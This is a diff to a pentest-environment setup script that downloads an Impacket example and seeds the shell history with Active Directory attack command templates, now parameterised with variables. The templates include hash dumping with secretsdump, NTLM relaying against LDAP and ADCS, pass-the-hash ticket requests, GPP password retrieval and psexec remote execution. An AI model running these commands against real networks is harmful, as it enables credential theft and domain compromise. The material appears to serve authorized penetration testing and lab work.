@@ -415,20 +415,20 @@ cd examples
 wget https://raw.githubusercontent.com/api0cradle/impacket/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py
 chmod +x rpcchangepwd.py
 echo "alias impacket-rpcchangepwd='$INTERNALS_DIR/impacket-0.12.0/bin/python3 $INTERNALS_DIR/impacket-0.12.0/examples/rpcchangepwd.py'" >> ~/.zshrc
-echo "impacket-addcomputer -computer-name 'MyComputer$' -computer-pass 'Password123' -dc-host 10.10.11.222 'DOMAIN/user:password'" >> ~/.zsh_history
+echo "impacket-addcomputer -computer-name 'MyComputer$' -computer-pass 'Password123' -dc-host \$DC '\$DOMAIN/\$USER:\$PASS'" >> ~/.zsh_history
 echo "impacket-changepasswd \$DOMAIN/\$MACHINE_ACC:\$PASS@\$IP -newpass 'P@ssw0rd' -p rpc-samr" >> ~/.zsh_history
-echo "impacket-Get-GPPPassword 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'" >> ~/.zsh_history
-echo "impacket-GetADUsers -all -dc-ip \$IP domain.local/username" >> ~/.zsh_history
-echo "impacket-getTGT domain.local/username -hashes :<NTLM> -dc-ip <DC-IP>" >> ~/.zsh_history
-echo "impacket-lookupsid \$DOMAIN/guest@\$IP" >> ~/.zsh_history
-echo "impacket-ntlmrelayx --lootdir "loot_relay" -of ~/ntlmrelay_hashs.txt -t "ldap://<DC-IP>" -smb2support --remove-mic" >> ~/.zsh_history
+echo "impacket-Get-GPPPassword \$DOMAIN/\$USER:\$PASS@\$DC" >> ~/.zsh_history
+echo "impacket-GetADUsers -all -dc-ip \$DC \$DOMAIN/\$USER" >> ~/.zsh_history
+echo "impacket-getTGT \$DOMAIN/\$USER -hashes :<NTLM> -dc-ip \$DC" >> ~/.zsh_history
+echo "impacket-lookupsid \$DOMAIN/guest@\$DC" >> ~/.zsh_history
+echo "impacket-ntlmrelayx --lootdir "loot_relay" -of ~/ntlmrelay_hashs.txt -t "ldap://\$DC" -smb2support --remove-mic" >> ~/.zsh_history
 echo "impacket-ntlmrelayx -of ~/ntlmrelay_hashs.txt -debug -smb2support -t http://<IP-PKI>/certsrv/certfnsh.asp --adcs --template [KerberosAuthentication/DomainController]" >> ~/.zsh_history
 echo "impacket-ntlmrelayx -of ~/ntlmrelay_hashs.txt -tf relay.txt -smb2support [-socks]" >> ~/.zsh_history
-echo "impacket-psexec 'domain.local/user:pass@10.10.11.222' whoami" >> ~/.zsh_history
+echo "impacket-psexec \$DOMAIN/\$USER:\$PASS@\$IP whoami" >> ~/.zsh_history
 echo "impacket-rpcchangepwd \$DOMAIN/\$MACHINE_ACC:\$PASS@\$IP -newpass 'P@ssw0rd'" >> ~/.zsh_history
-echo "impacket-secretsdump -target-ip IP [-just-dc-ntlm] [-history] USER@DOMAIN" >> ~/.zsh_history
-echo "impacket-smbclient 'domain.local/user:pass@10.10.11.222'" >> ~/.zsh_history
-echo "export KRB5CCNAME=$path_to_ticket.ccache" >> ~/.zsh_history
+echo "impacket-secretsdump -target-ip \$IP [-just-dc-ntlm] [-history] \$USER@\$DOMAIN" >> ~/.zsh_history
+echo "impacket-smbclient \$DOMAIN/\$USER:\$PASS@\$IP" >> ~/.zsh_history
+echo "export KRB5CCNAME=\$path_to_ticket.ccache" >> ~/.zsh_history
 
 # ItWasAllADream
 cd $INTERNALS_DIR
